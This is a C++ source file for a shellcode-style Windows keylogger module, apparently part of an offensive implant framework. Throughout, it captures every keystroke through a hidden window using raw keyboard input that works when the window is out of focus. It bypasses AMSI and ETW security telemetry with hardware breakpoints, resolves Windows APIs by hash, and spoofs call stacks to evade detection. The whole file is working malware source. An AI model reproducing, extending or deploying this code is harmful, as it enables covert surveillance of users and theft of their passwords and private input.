#include <General.hpp>

using namespace mscorlib;

auto DECLFN KeyloggerInstall(
) -> HRESULT {
    G_INSTANCE

    HRESULT          HResult     = 0;
    HANDLE           BckpStdout  = INVALID_HANDLE_VALUE;
    HANDLE           BackupPp  = INVALID_HANDLE_VALUE;
    auto KeyloggerCleanup = [&]() {
        return HResult;
    };

    if ( Instance->Ctx.ExecMethod == KH_METHOD_INLINE ) {
        BckpStdout = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
    }

    if ( Instance->Ctx.ExecMethod == KH_METHOD_FORK ) {
        SECURITY_ATTRIBUTES SecAttr = { 
            .nLength = sizeof(SECURITY_ATTRIBUTES), 
            .lpSecurityDescriptor = nullptr,
            .bInheritHandle = TRUE
        };

        Instance->Pipe.Write = Instance->Win32.CreateNamedPipeA(
            Instance->Pipe.Name, PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1, PIPE_BUFFER_LENGTH, PIPE_BUFFER_LENGTH, 0, &SecAttr
        );

        if ( Instance->Pipe.Write == INVALID_HANDLE_VALUE ) {
            DWORD err = NtCurrentTeb()->LastErrorValue;
            return KeyloggerCleanup();
        }

        if ( ! Instance->Win32.ConnectNamedPipe( Instance->Pipe.Write, nullptr ) && NtCurrentTeb()->LastErrorValue != ERROR_PIPE_CONNECTED) {
            DWORD err = NtCurrentTeb()->LastErrorValue;
            return KeyloggerCleanup();
        }

        BackupPp = Instance->Win32.GetStdHandle( STD_OUTPUT_HANDLE );
        Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, Instance->Pipe.Write );
    }

    if ( Instance->Ctx.Bypass ) {
        Hwbp::KeyloggerInit( Instance->Ctx.Bypass );
    }

    // Register a Window class
    WNDCLASSEX WinClass = { 0 };
    WinClass.cbSize        = sizeof(WinClass);
    WinClass.lpfnWndProc   = WndCallback;
    WinClass.hInstance     = GetModuleHandle(NULL);
    WinClass.lpszClassName = KEYLOG_CLASS_NAME;

    if (!Instance->Win32.RegisterClassExW(&WinClass))
    {
        DWORD err = NtCurrentTeb()->LastErrorValue;
        return  KeyloggerCleanup();
    }
    
    WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandle(NULL), NULL);
    if(! WindowHandle)
    {
        return KeyloggerCleanup();
    }

    RAWINPUTDEVICE RawDevice = { 0 };

    RawDevice.usUsagePage = HID_USAGE_PAGE_GENERIC;      // Generic Desktop Controls
    RawDevice.usUsage     = HID_USAGE_GENERIC_KEYBOARD; // Keyboard
    RawDevice.dwFlags     = RIDEV_INPUTSINK;            // Receive input even when not in focus
    RawDevice.hwndTarget  = WindowHandle;               // Our message-only window

    if (!Instance->Win32.RegisterRawInputDevices(&RawDevice, 1, sizeof(RAWINPUTDEVICE)))
    {
        return KeyloggerCleanup();
    }


    // deactive hwbp to bypass amsi/etw
    if ( Instance->Ctx.Bypass ) {
        Hwbp::KeyloggerExit();
    }

    if ( Instance->Ctx.ExecMethod == KH_METHOD_FORK ) {
        if ( FAILED( HResult ) ) {
            Instance->Win32.WriteFile( Instance->Pipe.Write, &HResult, sizeof( HResult ), nullptr, 0 );
        }

        Instance->Win32.FlushFileBuffers( Instance->Pipe.Write );
        Instance->Win32.SetStdHandle( STD_OUTPUT_HANDLE, BackupPp );
    }

    return KeyloggerCleanup();
}

auto DECLFN LibLoad( CHAR* LibName ) -> UPTR {
    G_INSTANCE

    if ( ! Instance->Ctx.IsSpoof ) {
        return (UPTR)Instance->Win32.LoadLibraryA( LibName );
    }

    Instance->Win32.DbgPrint("load %p\n", Instance->Win32.LoadLibraryA);

    return (UPTR)Spoof::Call( (UPTR)( Instance->Win32.LoadLibraryA ), 0, (UPTR)LibName );
}

auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
    UPTR Ntdll    = LoadModule( HashStr( "ntdll.dll" ) );
    UPTR Kernel32 = LoadModule( HashStr( "kernel32.dll" ) );

    Instance->Win32.Ntdll = Ntdll;
    
    Instance->Win32.DbgPrint = (decltype(Instance->Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));
    Instance->Win32.LoadLibraryA = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));

    Instance->Win32.NtClose = (decltype(Instance->Win32.NtClose))LoadApi(Ntdll, HashStr("NtClose"));

    Instance->Win32.GetProcAddress   = (decltype(Instance->Win32.GetProcAddress))LoadApi(Kernel32, HashStr("GetProcAddress"));
    Instance->Win32.GetModuleHandleA = (decltype(Instance->Win32.GetModuleHandleA))LoadApi(Kernel32, HashStr("GetModuleHandleA"));

    Instance->Win32.NtProtectVirtualMemory = (decltype(Instance->Win32.NtProtectVirtualMemory))LoadApi(Ntdll, HashStr("NtProtectVirtualMemory"));

    Instance->Win32.RtlAllocateHeap   = (decltype(Instance->Win32.RtlAllocateHeap))LoadApi(Ntdll, HashStr("RtlAllocateHeap"));
    Instance->Win32.RtlReAllocateHeap = (decltype(Instance->Win32.RtlReAllocateHeap))LoadApi(Ntdll, HashStr("RtlReAllocateHeap"));
    Instance->Win32.RtlFreeHeap       = (decltype(Instance->Win32.RtlFreeHeap))LoadApi(Ntdll, HashStr("RtlFreeHeap"));
    Instance->Win32.GetConsoleWindow        = (decltype(Instance->Win32.GetConsoleWindow))LoadApi(Kernel32, HashStr("GetConsoleWindow"));
    Instance->Win32.AllocConsoleWithOptions = (decltype(Instance->Win32.AllocConsoleWithOptions))LoadApi(Kernel32, HashStr("AllocConsoleWithOptions"));
    Instance->Win32.FreeConsole             = (decltype(Instance->Win32.FreeConsole))LoadApi(Kernel32, HashStr("FreeConsole"));

    Instance->Win32.CreateFileA         = (decltype(Instance->Win32.CreateFileA))LoadApi(Kernel32, HashStr("CreateFileA"));
    Instance->Win32.CreatePipe          = (decltype(Instance->Win32.CreatePipe))LoadApi(Kernel32, HashStr("CreatePipe"));
    Instance->Win32.CreateNamedPipeA    = (decltype(Instance->Win32.CreateNamedPipeA))LoadApi(Kernel32, HashStr("CreateNamedPipeA"));
    Instance->Win32.ConnectNamedPipe    = (decltype(Instance->Win32.ConnectNamedPipe))LoadApi(Kernel32, HashStr("ConnectNamedPipe"));
    Instance->Win32.DisconnectNamedPipe = (decltype(Instance->Win32.DisconnectNamedPipe))LoadApi(Kernel32, HashStr("DisconnectNamedPipe"));
    Instance->Win32.FlushFileBuffers    = (decltype(Instance->Win32.FlushFileBuffers))LoadApi(Kernel32, HashStr("FlushFileBuffers"));
    Instance->Win32.ReadFile            = (decltype(Instance->Win32.ReadFile))LoadApi(Kernel32, HashStr("ReadFile"));
    Instance->Win32.WriteFile           = (decltype(Instance->Win32.WriteFile))LoadApi(Kernel32, HashStr("WriteFile"));
    Instance->Win32.SetStdHandle        = (decltype(Instance->Win32.SetStdHandle))LoadApi(Kernel32, HashStr("SetStdHandle"));
    Instance->Win32.GetStdHandle        = (decltype(Instance->Win32.GetStdHandle))LoadApi(Kernel32, HashStr("GetStdHandle"));

    Instance->Win32.NtGetContextThread = (decltype(Instance->Win32.NtGetContextThread))LoadApi(Ntdll, HashStr("NtGetContextThread"));
    Instance->Win32.NtContinue         = (decltype(Instance->Win32.NtContinue))LoadApi(Ntdll, HashStr("NtContinue"));
    Instance->Win32.RtlCaptureContext  = (decltype(Instance->Win32.RtlCaptureContext))LoadApi(Ntdll, HashStr("RtlCaptureContext"));

    Instance->Win32.RtlAddVectoredExceptionHandler    = (decltype(Instance->Win32.RtlAddVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlAddVectoredExceptionHandler"));
    Instance->Win32.RtlRemoveVectoredExceptionHandler = (decltype(Instance->Win32.RtlRemoveVectoredExceptionHandler))LoadApi(Ntdll, HashStr("RtlRemoveVectoredExceptionHandler"));

    Instance->Win32.RtlInitializeCriticalSection = (decltype(Instance->Win32.RtlInitializeCriticalSection))LoadApi(Ntdll, HashStr("RtlInitializeCriticalSection"));
    Instance->Win32.RtlEnterCriticalSection = (decltype(Instance->Win32.RtlEnterCriticalSection))LoadApi(Ntdll, HashStr("RtlEnterCriticalSection"));
    Instance->Win32.RtlLeaveCriticalSection = (decltype(Instance->Win32.RtlLeaveCriticalSection))LoadApi(Ntdll, HashStr("RtlLeaveCriticalSection"));

    Instance->Win32.RtlLookupFunctionEntry = (decltype(Instance->Win32.RtlLookupFunctionEntry))LoadApi(Ntdll, HashStr("RtlLookupFunctionEntry"));
    Instance->Win32.RtlUserThreadStart     = (decltype(Instance->Win32.RtlUserThreadStart))LoadApi(Ntdll, HashStr("RtlUserThreadStart"));
    Instance->Win32.BaseThreadInitThunk    = (decltype(Instance->Win32.BaseThreadInitThunk))LoadApi(Kernel32, HashStr("BaseThreadInitThunk"));

    Instance->Spf.First.Ptr  = (PVOID)( (UPTR)Instance->Win32.RtlUserThreadStart  + 0x21 );
    Instance->Spf.Second.Ptr = (PVOID)( (UPTR)Instance->Win32.BaseThreadInitThunk + 0x14 );

    Instance->Win32.RtlExitUserThread  = (decltype(Instance->Win32.RtlExitUserThread))LoadApi(Ntdll, HashStr("RtlExitUserThread"));
    Instance->Win32.RtlExitUserProcess = (decltype(Instance->Win32.RtlExitUserProcess))LoadApi(Ntdll, HashStr("RtlExitUserProcess"));
    
    Instance->Hwbp.NtTraceEvent   = (PVOID)LoadApi(Ntdll, HashStr("NtTraceEvent"));
}

auto DECLFN LoadAdds( INSTANCE* Instance ) -> VOID {
    UPTR User32   = LoadModule( HashStr( "user32.dll" ) );
    UPTR Shell32  = LoadModule( HashStr( "shell32.dll" ) );
    UPTR Oleaut32 = LoadModule( HashStr( "oleaut32.dll" ) );
    UPTR Mscoree  = LoadModule( HashStr( "mscoree.dll" ) );
    UPTR Amsi     = LoadModule( HashStr( "amsi.dll" ) );

    if ( ! User32   ) User32   = (UPTR)LibLoad( "user32.dll" );
    if ( ! Shell32  ) Shell32  = (UPTR)LibLoad( "shell32.dll" );
    if ( ! Oleaut32 ) Oleaut32 = (UPTR)LibLoad( "oleaut32.dll" );
    if ( ! Mscoree  ) Mscoree  = (UPTR)LibLoad( "mscoree.dll" );
    if ( ! Amsi     ) Amsi     = (UPTR)LibLoad( "amsi.dll" );

    Instance->Win32.CLRCreateInstance = (decltype(Instance->Win32.CLRCreateInstance))LoadApi(Mscoree, HashStr("CLRCreateInstance"));

    Instance->Win32.SafeArrayAccessData   = (decltype(Instance->Win32.SafeArrayAccessData))LoadApi(Oleaut32, HashStr("SafeArrayAccessData"));
    Instance->Win32.SafeArrayGetLBound    = (decltype(Instance->Win32.SafeArrayGetLBound))LoadApi(Oleaut32, HashStr("SafeArrayGetLBound"));        
    Instance->Win32.SafeArrayGetUBound    = (decltype(Instance->Win32.SafeArrayGetUBound))LoadApi(Oleaut32, HashStr("SafeArrayGetUBound"));
    Instance->Win32.SafeArrayCreateVector = (decltype(Instance->Win32.SafeArrayCreateVector))LoadApi(Oleaut32, HashStr("SafeArrayCreateVector"));
    Instance->Win32.SafeArrayCreate       = (decltype(Instance->Win32.SafeArrayCreate))LoadApi(Oleaut32, HashStr("SafeArrayCreate"));
    Instance->Win32.SafeArrayDestroy      = (decltype(Instance->Win32.SafeArrayDestroy))LoadApi(Oleaut32, HashStr("SafeArrayDestroy"));
    Instance->Win32.SafeArrayPutElement   = (decltype(Instance->Win32.SafeArrayPutElement))LoadApi(Oleaut32, HashStr("SafeArrayPutElement"));
    Instance->Win32.SysAllocString        = (decltype(Instance->Win32.SysAllocString))LoadApi(Oleaut32, HashStr("SysAllocString"));
    Instance->Win32.SysFreeString         = (decltype(Instance->Win32.SysFreeString))LoadApi(Oleaut32, HashStr("SysFreeString"));
    Instance->Win32.VariantClear          = (decltype(Instance->Win32.VariantClear))LoadApi(Oleaut32, HashStr("VariantClear"));

    Instance->Win32.CommandLineToArgvW = (decltype(Instance->Win32.CommandLineToArgvW))LoadApi(Shell32, HashStr("CommandLineToArgvW"));

    Instance->Hwbp.AmsiScanBuffer = (PVOID)LoadApi(Amsi, HashStr("AmsiScanBuffer"));
}

EXTERN_C
auto DECLFN Entry( PVOID Parameter ) -> VOID {
    INSTANCE Instance = { 0 };

    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)&Instance;

    Instance.Start      = StartPtr();
    Instance.Size       = (UPTR)EndPtr() - (UPTR)Instance.Start;
    Instance.HeapHandle = NtCurrentPeb()->ProcessHeap;

    LoadEssentials( &Instance );

    HRESULT Result = S_OK;

    ULONG Length    = 0;

    LoadAdds( &Instance );

    
    Result = KeyloggerInstall();

    if ( Instance.Ctx.ExecMethod == KH_METHOD_FORK && Instance.Ctx.ForkCategory == KH_INJECT_SPAWN ) {
        Instance.Win32.RtlExitUserProcess( Result );
    } else {
        Instance.Win32.RtlExitUserThread( Result );
    }
}